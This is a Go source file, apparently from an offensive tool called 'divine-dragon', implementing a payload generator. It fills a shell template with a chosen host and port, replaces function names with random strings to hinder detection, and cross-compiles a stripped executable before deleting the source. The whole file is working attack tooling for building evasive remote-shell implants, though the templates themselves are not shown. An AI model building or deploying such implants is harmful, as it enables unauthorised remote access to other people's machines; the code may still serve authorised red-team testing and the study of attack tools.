package payload_generator

import (
	"divine-dragon/util"
	"fmt"
	"os/exec"
	"strings"

	"github.com/gobuffalo/packr"
)

type PayloadGeneratorModule struct {
	host           string
	port           string
	shellType      string
	platform       string
	arch           string
	executableName string

	logger util.Logger
}

func NewPayloadGeneratorModule(hostOpt string, portOpt string, shellTypeOpt string, platformOpt string, archOpt string, executableNameOpt string) *PayloadGeneratorModule {
	pg := PayloadGeneratorModule{
		host:           hostOpt,
		port:           portOpt,
		shellType:      shellTypeOpt,
		platform:       platformOpt,
		arch:           archOpt,
		executableName: executableNameOpt,
	}
	pg.logger = util.PayloadGeneratorLogger(false, "")
	return &pg
}

func (pg *PayloadGeneratorModule) Run() {
	payloadSource, err := pg.preparePayloadSource()
	if err != nil {
		pg.logger.Log.Error(err)
	}
	pg.logger.Log.Noticef("Your payload for shell was generated in file %s:", pg.executableName)
	pg.logger.Log.Noticef("See the source code below:\n%s", payloadSource)
	err = pg.compilePayload(payloadSource)
	if err != nil {
		pg.logger.Log.Error(err)
	}
}

func (pg *PayloadGeneratorModule) preparePayloadSource() (string, error) {
	payloadSource, err := packr.NewBox("./templates/").FindString(pg.shellType + ".go")
	if err != nil {
		return "", fmt.Errorf("can't get template from templates/ folder: %v", err)
	}
	payloadSource = strings.Replace(payloadSource, "HOST", pg.host, -1)
	payloadSource = strings.Replace(payloadSource, "PORT", pg.port, -1)
	funcPatterns := []string{"WRITETOFILE", "SHELL", "FILENAME"}
	for _, funcPattern := range funcPatterns {
		payloadSource = strings.Replace(payloadSource, funcPattern, util.RandString(util.RandInt()), -1)
	}
	return payloadSource, nil
}

func (pg *PayloadGeneratorModule) compilePayload(payloadSource string) error {
	payloadSourceFileName := util.RandString(util.RandInt()) + ".go"
	err := util.WriteToFile(payloadSourceFileName, payloadSource)
	if err != nil {
		return err
	}
	out, err := exec.Command("env",
		fmt.Sprintf("GOOS=%s", pg.platform),
		fmt.Sprintf("GOARCH=%s", pg.arch),
		"go",
		"build",
		"-o",
		pg.executableName,
		"-ldflags",
		"-w -s",
		payloadSourceFileName).Output()
	if err != nil {
		return err
	}
	if string(out) != "" {
		return fmt.Errorf("can't compile a binary: %s", string(out))
	}
	err = util.RemoveFile(payloadSourceFileName)
	if err != nil {
		return fmt.Errorf("can't delete a file %s: %v", payloadSourceFileName, err)
	}
	return nil
}
